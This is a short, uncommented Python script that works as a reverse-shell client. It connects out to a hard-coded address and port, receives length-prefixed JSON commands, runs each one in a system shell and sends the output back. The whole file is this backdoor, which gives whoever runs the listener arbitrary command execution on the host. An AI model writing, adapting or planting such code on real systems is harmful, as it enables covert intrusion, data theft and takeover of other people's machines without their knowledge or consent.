#!/usr/bin/python
import socket
import subprocess
import json
import os
import struct


def send_frame(target, data):
    prefix = struct.pack(">I", len(data))
    target.send(prefix)
    target.send(data)


def receive_frame(target):
    prefix = b""
    prefix_len = 4
    while len(prefix) < prefix_len:
        prefix += target.recv(prefix_len-len(prefix))

    frame = b""
    frame_len = struct.unpack(">I", prefix)[0]
    while len(frame) < frame_len:
        frame += target.recv(min(1024, frame_len-len(frame)))
    return json.loads(frame.decode("utf-8"))


def reliable_send(target, data):
    json_data = json.dumps(data).encode("utf-8")
    send_frame(target, json_data)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.100.1", 11221))
while True:
    result = ""
    cmd = receive_frame(sock)
    print(cmd)
    if cmd == "q":
        break
    if cmd[:2] == "cd" and len(cmd.strip()) > 3:
        try:
            os.chdir(cmd[3:])
        except:
            continue
    else:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = (proc.stdout.read() + proc.stderr.read()).decode("utf-8")
    reliable_send(sock, result)

sock.close()
